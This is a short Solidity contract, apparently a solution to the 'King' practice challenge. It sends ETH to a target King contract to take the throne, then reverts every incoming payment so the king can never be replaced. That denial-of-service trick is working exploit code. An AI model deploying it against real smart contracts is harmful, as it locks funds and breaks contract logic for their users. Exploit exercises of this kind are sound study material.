// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {King} from "./King.sol";

contract KingExploit {
    constructor(King targetContract) payable {
        (bool success, ) = address(targetContract).call{value: msg.value}("");

        require(
            msg.sender == 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,
            "unauthorized!"
        );
        require(success == true, "Failed to exploit");
    }

    receive() external payable {
        revert("No.");
    }
}
